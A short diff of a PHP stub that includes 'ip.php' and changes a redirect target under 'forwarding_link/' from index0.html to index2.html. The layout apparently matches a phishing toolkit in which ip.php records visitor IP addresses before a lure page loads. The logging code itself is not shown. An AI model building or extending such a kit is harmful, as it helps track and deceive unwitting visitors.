@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: forwarding_link/index0.html');
+header('Location: forwarding_link/index2.html');
 exit
 ?>
